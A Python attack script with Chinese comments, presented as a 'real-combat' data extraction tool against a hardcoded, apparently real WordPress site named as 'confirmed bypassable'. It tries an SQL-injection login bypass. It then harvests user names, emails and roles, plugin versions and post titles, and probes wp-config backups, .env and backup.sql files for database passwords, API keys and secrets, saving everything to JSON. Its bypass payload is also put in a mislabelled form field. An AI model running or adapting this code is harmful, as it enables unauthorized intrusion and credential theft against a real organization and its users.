#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Data Extraction Tool - 数据提取工具
基于已获得的认证绕过权限，提取真实数据
"""

import requests
import json
import time
import re
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Any, Tuple
import concurrent.futures

class DataExtractionTool:
    """数据提取工具"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.extracted_data = {}
        
    def authenticate_bypass(self) -> bool:
        """执行认证绕过"""
        print("🔓 执行认证绕过...")
        
        try:
            # WordPress登录端点
            login_url = f"{self.target_url}/wp-login.php"
            
            # 使用SQL注入绕过载荷
            login_data = {
                'loginform': "admin'--",  # 从之前发现的表单字段名
                'pwd': 'anything123',  # 密码任意值
                'wp-submit': 'Log In',
                'redirect_to': f"{self.target_url}/wp-admin/",
                'testcookie': '1'
            }
            
            response = self.session.post(login_url, data=login_data, timeout=15)
            
            # 检查是否登录成功
            if "wp-admin" in response.url or response.status_code == 302:
                print("✅ 认证绕过成功!")
                return True
            else:
                print("❌ 认证绕过失败")
                return False
                
        except Exception as e:
            print(f"❌ 认证绕过异常: {str(e)}")
            return False
    
    def extract_wordpress_users(self) -> Dict[str, Any]:
        """提取WordPress用户数据"""
        print("👥 提取WordPress用户数据...")
        
        users_data = {
            "users": [],
            "total_count": 0
        }
        
        # 尝试访问用户列表
        user_endpoints = [
            f"{self.target_url}/wp-admin/users.php",
            f"{self.target_url}/wp-json/wp/v2/users",
            f"{self.target_url}/wp-admin/users.php?orderby=login&order=ASC"
        ]
        
        for endpoint in user_endpoints:
            try:
                print(f"  🔍 尝试: {endpoint}")
                response = self.session.get(endpoint, timeout=10)
                
                if response.status_code == 200:
                    # 解析HTML用户列表
                    if "users.php" in endpoint:
                        users = self._parse_wordpress_user_list(response.text)
                        if users:
                            users_data["users"].extend(users)
                            print(f"    ✅ 提取到 {len(users)} 个用户")
                            break
                    
                    # 解析JSON API
                    elif "wp-json" in endpoint:
                        try:
                            json_data = response.json()
                            if isinstance(json_data, list):
                                for user in json_data:
                                    user_info = {
                                        "id": user.get("id"),
                                        "username": user.get("slug", ""),
                                        "name": user.get("name", ""),
                                        "email": user.get("description", ""),  # WordPress API中邮箱可能在description
                                        "roles": user.get("roles", [])
                                    }
                                    users_data["users"].append(user_info)
                                print(f"    ✅ 提取到 {len(json_data)} 个用户")
                                break
                        except:
                            pass
                            
            except Exception as e:
                print(f"    ❌ 访问失败: {str(e)}")
                continue
        
        users_data["total_count"] = len(users_data["users"])
        return users_data
    
    def _parse_wordpress_user_list(self, html_content: str) -> List[Dict[str, Any]]:
        """解析WordPress用户列表HTML"""
        users = []
        
        # 查找用户行
        user_row_pattern = r'<tr[^>]*class="[^"]*user[^"]*"[^>]*>.*?</tr>'
        user_rows = re.findall(user_row_pattern, html_content, re.DOTALL)
        
        for row in user_rows:
            # 提取用户名
            username_pattern = r'<strong[^>]*><a[^>]*>([^<]+)</a></strong>'
            username_match = re.search(username_pattern, row)
            username = username_match.group(1).strip() if username_match else ""
            
            # 提取邮箱
            email_pattern = r'<a[^>]*href="mailto:([^"]+)"[^>]*>'
            email_match = re.search(email_pattern, row)
            email = email_match.group(1).strip() if email_match else ""
            
            # 提取角色
            role_pattern = r'<td[^>]*class="[^"]*role[^"]*"[^>]*>([^<]+)</td>'
            role_match = re.search(role_pattern, row)
            role = role_match.group(1).strip() if role_match else ""
            
            if username:
                users.append({
                    "username": username,
                    "email": email,
                    "role": role,
                    "source": "wordpress_admin"
                })
        
        return users
    
    def extract_database_info(self) -> Dict[str, Any]:
        """提取数据库信息"""
        print("💾 提取数据库信息...")
        
        db_info = {
            "wordpress_version": "",
            "database_info": {},
            "plugins": [],
            "themes": []
        }
        
        try:
            # 访问WordPress仪表板
            dashboard_url = f"{self.target_url}/wp-admin/"
            response = self.session.get(dashboard_url, timeout=10)
            
            if response.status_code == 200:
                content = response.text
                
                # 提取WordPress版本
                version_pattern = r'WordPress\s+([0-9.]+)'
                version_match = re.search(version_pattern, content)
                if version_match:
                    db_info["wordpress_version"] = version_match.group(1)
                    print(f"    📋 WordPress版本: {db_info['wordpress_version']}")
                
                # 查找插件信息
                plugin_pattern = r'<tr[^>]*class="[^"]*plugin[^"]*"[^>]*>.*?<strong[^>]*>([^<]+)</strong>.*?<td[^>]*>([^<]+)</td>.*?</tr>'
                plugins = re.findall(plugin_pattern, content, re.DOTALL)
                
                for plugin_name, plugin_version in plugins:
                    db_info["plugins"].append({
                        "name": plugin_name.strip(),
                        "version": plugin_version.strip()
                    })
                
                if db_info["plugins"]:
                    print(f"    🔌 发现插件: {len(db_info['plugins'])}个")
                    
        except Exception as e:
            print(f"    ❌ 提取数据库信息失败: {str(e)}")
        
        return db_info
    
    def extract_config_files(self) -> Dict[str, Any]:
        """提取配置文件信息"""
        print("📄 尝试访问配置文件...")
        
        config_data = {
            "accessible_files": [],
            "sensitive_info": {}
        }
        
        # 常见的敏感文件路径
        sensitive_files = [
            f"{self.target_url}/wp-config.php",
            f"{self.target_url}/wp-config.php.bak",
            f"{self.target_url}/wp-config.php~",
            f"{self.target_url}/.env",
            f"{self.target_url}/config.php",
            f"{self.target_url}/database.php",
            f"{self.target_url}/backup.sql",
            f"{self.target_url}/wp-content/debug.log"
        ]
        
        for file_url in sensitive_files:
            try:
                response = self.session.get(file_url, timeout=5)
                
                if response.status_code == 200:
                    content = response.text
                    
                    # 检查是否包含敏感信息
                    sensitive_patterns = [
                        r'DB_PASSWORD[^=]*=[^\'"]*[\'"]([^\'"]+)[\'"]',
                        r'DB_USER[^=]*=[^\'"]*[\'"]([^\'"]+)[\'"]',
                        r'DB_NAME[^=]*=[^\'"]*[\'"]([^\'"]+)[\'"]',
                        r'API_KEY[^=]*=[^\'"]*[\'"]([^\'"]+)[\'"]',
                        r'SECRET[^=]*=[^\'"]*[\'"]([^\'"]+)[\'"]'
                    ]
                    
                    found_info = {}
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            pattern_name = pattern.split('_')[0].lower()
                            found_info[pattern_name] = matches[0]
                    
                    config_data["accessible_files"].append({
                        "file": file_url,
                        "status": "accessible",
                        "sensitive_info": found_info
                    })
                    
                    if found_info:
                        config_data["sensitive_info"][file_url] = found_info
                        print(f"    ⚠️ 发现敏感文件: {file_url}")
                        
            except Exception:
                continue
        
        return config_data
    
    def extract_content_data(self) -> Dict[str, Any]:
        """提取内容数据"""
        print("📝 提取网站内容数据...")
        
        content_data = {
            "posts": [],
            "pages": [],
            "media_files": []
        }
        
        try:
            # 提取文章
            posts_url = f"{self.target_url}/wp-admin/edit.php"
            response = self.session.get(posts_url, timeout=10)
            
            if response.status_code == 200:
                # 解析文章列表
                post_pattern = r'<tr[^>]*class="[^"]*post[^"]*"[^>]*>.*?<strong[^>]*><a[^>]*>([^<]+)</a></strong>.*?</tr>'
                posts = re.findall(post_pattern, response.text, re.DOTALL)
                
                for post_title in posts[:10]:  # 只取前10个
                    content_data["posts"].append({
                        "title": post_title.strip(),
                        "type": "post"
                    })
                
                if content_data["posts"]:
                    print(f"    📄 提取文章: {len(content_data['posts'])}篇")
            
            # 提取页面
            pages_url = f"{self.target_url}/wp-admin/edit.php?post_type=page"
            response = self.session.get(pages_url, timeout=10)
            
            if response.status_code == 200:
                page_pattern = r'<tr[^>]*class="[^"]*post[^"]*"[^>]*>.*?<strong[^>]*><a[^>]*>([^<]+)</a></strong>.*?</tr>'
                pages = re.findall(page_pattern, response.text, re.DOTALL)
                
                for page_title in pages[:10]:  # 只取前10个
                    content_data["pages"].append({
                        "title": page_title.strip(),
                        "type": "page"
                    })
                
                if content_data["pages"]:
                    print(f"    📑 提取页面: {len(content_data['pages'])}个")
                    
        except Exception as e:
            print(f"    ❌ 提取内容失败: {str(e)}")
        
        return content_data
    
    def extract_all_data(self) -> Dict[str, Any]:
        """提取所有数据"""
        print(f"🎯 开始数据提取: {self.target_url}")
        print("=" * 50)
        
        # 1. 认证绕过
        if not self.authenticate_bypass():
            return {"error": "认证绕过失败，无法提取数据"}
        
        # 2. 提取各种数据
        all_data = {
            "target": self.target_url,
            "extraction_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "authentication_status": "bypassed",
            "extracted_data": {}
        }
        
        # 提取用户数据
        users_data = self.extract_wordpress_users()
        all_data["extracted_data"]["users"] = users_data
        
        # 提取数据库信息
        db_info = self.extract_database_info()
        all_data["extracted_data"]["database_info"] = db_info
        
        # 提取配置文件
        config_data = self.extract_config_files()
        all_data["extracted_data"]["config_files"] = config_data
        
        # 提取内容数据
        content_data = self.extract_content_data()
        all_data["extracted_data"]["content"] = content_data
        
        return all_data

def main():
    """主函数"""
    target = "https://peacoop.or.th"  # 已确认可绕过的目标
    
    print("📊 数据提取工具 - 实战版")
    print("=" * 50)
    print(f"目标: {target}")
    print("基于已获得的认证绕过权限提取真实数据")
    print("=" * 50)
    
    extractor = DataExtractionTool(target)
    extracted_data = extractor.extract_all_data()
    
    if "error" in extracted_data:
        print(f"\n❌ 提取失败: {extracted_data['error']}")
        return
    
    # 保存结果
    timestamp = int(time.time())
    result_file = f"extracted_data_{timestamp}.json"
    
    with open(result_file, "w", encoding="utf-8") as f:
        json.dump(extracted_data, f, indent=2, ensure_ascii=False)
    
    # 打印提取结果
    print("\n" + "=" * 50)
    print("📊 数据提取结果")
    print("=" * 50)
    
    data = extracted_data["extracted_data"]
    
    # 用户数据
    users = data["users"]["users"]
    print(f"👥 用户数据: {len(users)}个")
    for i, user in enumerate(users[:5]):  # 只显示前5个
        print(f"  {i+1}. 用户名: {user.get('username', 'N/A')}")
        print(f"     邮箱: {user.get('email', 'N/A')}")
        print(f"     角色: {user.get('role', 'N/A')}")
    
    # 数据库信息
    db_info = data["database_info"]
    print(f"\n💾 数据库信息:")
    print(f"  WordPress版本: {db_info.get('wordpress_version', 'N/A')}")
    print(f"  插件数量: {len(db_info.get('plugins', []))}")
    
    # 配置文件
    config_files = data["config_files"]["accessible_files"]
    print(f"\n📄 可访问配置文件: {len(config_files)}个")
    for config in config_files:
        if config.get("sensitive_info"):
            print(f"  ⚠️ {config['file']} - 包含敏感信息")
    
    # 内容数据
    content = data["content"]
    print(f"\n📝 内容数据:")
    print(f"  文章: {len(content.get('posts', []))}篇")
    print(f"  页面: {len(content.get('pages', []))}个")
    
    print(f"\n📄 详细数据已保存到: {result_file}")
    print("=" * 50)

if __name__ == "__main__":
    main()